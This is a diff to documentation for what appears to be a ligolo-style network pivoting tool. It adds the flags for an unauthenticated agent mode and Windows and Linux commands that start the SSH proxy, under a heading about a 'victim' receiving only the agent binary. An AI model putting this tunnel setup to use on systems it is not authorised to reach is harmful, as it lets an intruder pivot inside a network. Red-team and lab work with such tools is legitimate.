@@ -93,6 +93,11 @@ mode. `agent-garble.exe` or `agent-garble` can replace the normal agent.
 
 ## No agent key: victim receives only the binary
 
+No-key mode requires flags on both sides:
+
+- Proxy: `-ssh-insecure-allow-no-auth`
+- Normal or ShadowPort agent: `-ssh-insecure-no-auth`
+
 Generate only `proxy-host` on the proxy. Start the proxy with the explicit
 no-auth flag:
 
@@ -190,6 +195,29 @@ With an SSH agent key:
 ```
 
 Without an agent key, but with proxy fingerprint verification:
+
+Start the proxy first. This command is shared by normal and ShadowPort agents;
+`-allow-shadow-port` belongs only on the ShadowPort agent.
+
+Windows proxy:
+
+```powershell
+.\proxy.exe `
+  -laddr ssh://0.0.0.0:22 `
+  -ssh-user ligolo `
+  -ssh-host-key .\keys\proxy-host `
+  -ssh-insecure-allow-no-auth
+```
+
+Linux proxy:
+
+```bash
+sudo ./proxy \
+  -laddr ssh://0.0.0.0:22 \
+  -ssh-user ligolo \
+  -ssh-host-key ./keys/proxy-host \
+  -ssh-insecure-allow-no-auth
+```
 
 ```powershell
 .\agent-shadow.exe `
